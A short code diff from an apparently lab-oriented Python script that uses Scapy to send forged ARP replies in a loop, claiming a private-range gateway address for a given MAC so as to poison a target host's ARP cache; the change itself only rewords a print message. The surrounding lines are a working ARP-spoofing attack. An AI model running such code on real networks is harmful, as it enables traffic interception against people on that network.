@@ -7,7 +7,7 @@ while True:
     try:
         packet = Ether()/ARP(op="is-at", hwdst="ff:ff:ff:ff:ff:ff", hwsrc="00:0c:29:62:03:88", psrc="192.168.91.2", pdst="192.168.91.144")
         sendp(packet)
-        print("ARP-packet sent:", packet.summary())
+        print("ARP-packet send:", packet.summary())
     except Exception as e:
         print(f"Failed: {e}")
 
